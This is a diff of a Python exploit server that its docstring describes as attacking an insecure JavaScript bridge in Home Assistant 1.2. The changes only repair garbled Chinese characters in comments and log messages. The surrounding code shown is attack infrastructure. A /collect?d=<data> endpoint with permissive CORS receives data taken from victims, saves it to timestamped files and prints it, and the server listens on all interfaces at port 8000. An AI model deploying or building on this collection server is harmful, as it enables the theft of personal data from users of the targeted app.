@@ -3,7 +3,7 @@
 Home Assistant 1.2 - Insecure JavaScript Bridge Implementation
 攻击服务器：提供恶意页面 + 数据回收
 
-端口: 8000 HTTP 主服�?
+端口: 8000 HTTP 主服务
 
 接口:
   GET  /collect?d=<data>    统一数据回收
@@ -56,7 +56,7 @@ class ExpHandler(BaseHTTPRequestHandler):
                 fname = f"collected_{ts}.txt"
                 with open(os.path.join(OUT_DIR, fname), "w", encoding="utf-8") as f:
                     f.write(up.unquote(data))
-                print(f"[+] 数据已回�?-> {fname}")
+                print(f"[+] 数据已回收 -> {fname}")
                 print(f"    内容: {up.unquote(data)[:200]}")
             self.send_response(200)
             self.send_header("Access-Control-Allow-Origin", "*")
@@ -96,7 +96,7 @@ class ExpHandler(BaseHTTPRequestHandler):
 if __name__ == "__main__":
     port = 8000
     server = HTTPServer(("0.0.0.0", port), ExpHandler)
-    print(f"[*] 服务器启�? http://0.0.0.0:{port}")
+    print(f"[*] 服务器启动: http://0.0.0.0:{port}")
     try:
         server.serve_forever()
     except KeyboardInterrupt:
